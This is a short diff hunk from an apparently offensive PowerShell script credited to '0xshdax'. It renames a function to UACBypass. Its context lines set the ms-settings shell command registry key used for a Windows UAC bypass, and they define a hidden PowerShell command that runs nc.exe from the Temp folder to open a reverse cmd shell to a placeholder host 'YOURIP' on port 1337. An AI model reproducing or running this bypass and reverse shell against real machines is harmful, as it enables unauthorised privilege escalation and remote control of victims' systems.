@@ -3,7 +3,7 @@
     Author: 0xshdax
 #>
 
-function RunCommands {
+function UACBypass {
     $REG_KEY = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
     $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
 
